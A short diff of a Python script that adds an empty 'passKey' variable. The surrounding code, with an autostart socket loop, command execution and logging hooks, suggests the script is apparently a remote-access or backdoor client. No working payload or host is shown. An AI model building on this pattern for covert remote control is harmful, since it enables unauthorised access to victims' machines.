@@ -12,6 +12,7 @@ active = False
 printf = ''
 hooked = {}
 loggingState = False
+passKey = r''
 
 
 def Send(sock, cmd, end="[ENDOFMESSAGE]"):
@@ -54,6 +55,7 @@ def Exec(cmde):
 
 def fromAutostart():
     global active
+    global passKey
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
